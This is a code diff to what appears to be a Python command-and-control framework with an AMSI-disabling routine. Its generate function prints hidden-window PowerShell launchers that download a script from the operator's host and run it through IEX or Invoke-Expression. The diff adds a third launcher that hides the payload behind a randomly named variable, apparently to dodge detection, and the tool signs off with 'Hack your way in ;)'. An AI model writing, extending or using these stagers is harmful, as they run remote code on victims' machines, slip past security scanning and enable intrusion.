@@ -6,6 +6,8 @@ from flask import *
 from termcolor import colored
 import logging
 import base64
+import random
+import string
 from .encryption import *
 from profile import *
 import time
@@ -128,9 +130,11 @@ def disable_amsi(session):
 		print((colored("[-] AMSI Module is not exist !")))
 
 def generate(hostname, path, proto, interval):
+    c = random.choice(string.ascii_lowercase)
     print((colored("#====================", "red")))
     print(("powershell -w hidden " + '"IEX (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"'.format(hostname, path, proto)))
     print(("powershell -w hidden " + '"Invoke-Expression (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');"'.format(hostname, path, proto)))
+    print(("powershell -w hidden " + '"${3} = (New-Object Net.WebClient).DownloadString(\'{2}://{0}/{1}\');Invoke-Expression ${3};"'.format(hostname, path, proto, c)))
     print("Hack your way in ;)")
     print((colored("#====================", "red")))
 
